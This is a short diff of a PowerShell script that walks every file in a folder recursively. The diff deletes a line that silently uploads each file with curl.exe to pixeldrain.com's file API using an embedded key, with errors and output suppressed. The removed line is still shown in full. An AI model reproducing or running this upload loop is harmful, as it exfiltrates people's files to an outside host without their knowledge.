@@ -8,10 +8,11 @@ $Files = Get-ChildItem -Path $FolderPath -File -Recurse
 
 foreach ($File in $Files) {
     try {
-        curl.exe -T "$($File.FullName)" -u ":310c295d-cdfb-449a-98dd-121ef3b1ab3e" https://pixeldrain.com/api/file/ > $null 2>&1
+        
     } catch {
         # Errors are silently ignored
     }
 }
+
 
 
